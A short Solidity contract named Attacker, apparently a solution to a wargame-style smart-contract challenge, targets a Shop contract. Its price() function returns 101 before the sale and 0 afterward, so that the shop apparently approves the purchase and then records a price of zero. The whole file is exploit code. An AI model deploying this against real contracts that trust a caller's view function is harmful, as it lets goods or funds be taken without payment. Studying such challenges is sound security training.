// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract Attacker {
  Shop public shop;

  constructor(address _shop) payable {
    shop = Shop(_shop);
  }

  function price() external view returns (uint) {
    return shop.isSold() ? 0 : 101; 
  }

  function attack() public {
    shop.buy();
  }
}